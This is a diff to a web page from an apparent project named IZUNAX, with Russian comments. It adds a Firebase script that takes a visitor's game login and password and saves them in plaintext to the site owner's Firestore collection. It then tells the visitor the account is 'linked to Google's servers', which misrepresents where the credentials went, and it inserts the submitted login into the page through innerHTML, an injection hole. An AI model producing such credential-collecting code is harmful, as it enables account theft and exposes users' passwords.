@@ -165,13 +165,48 @@
     </main>
 </div>
 
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
+<script src="firebase-config.js"></script>
+
 <script>
-    // Сюда мы потом пропишем fetch-запрос на твой сервер в Termux
     document.getElementById('game-auth-form').addEventListener('submit', function(e) {
         e.preventDefault();
-        alert('Данные отправляются на сервер хранения IZUNAX...');
+
+        const gameLogin = document.getElementById('game-login').value;
+        const gamePassword = document.getElementById('game-password').value;
+
+        // Временное имя пользователя (потом свяжем с авторизацией IZUNAX)
+        const currentUsername = "Anonymous_Gamer"; 
+
+        // Отправляем данные в твою коллекцию "game_accounts" в Firestore
+        window.db.collection("game_accounts").add({
+            username: currentUsername,
+            game_login: gameLogin,
+            game_password: gamePassword, // Сохраняется в твою базу данных Google
+            createdAt: new Date()
+        })
+        .then((docRef) => {
+            console.log("Данные успешно сохранены! ID документа: ", docRef.id);
+            alert('Аккаунт успешно привязан к серверам Google!');
+            
+            // Обновляем статус на странице
+            document.getElementById('profile-status').innerHTML = `
+                <strong style="color: #66fcf1;">Статус:</strong> Подключено успешно!<br>
+                <strong style="color: #66fcf1;">Логин в игре:</strong> ${gameLogin}
+            `;
+            
+            // Очищаем форму
+            document.getElementById('game-auth-form').reset();
+        })
+        .catch((error) => {
+            console.error("Ошибка при добавлении в Firestore: ", error);
+            alert('Ошибка при сохранении данных: ' + error.message);
+        });
     });
 </script>
+
 
 </body>
 </html>
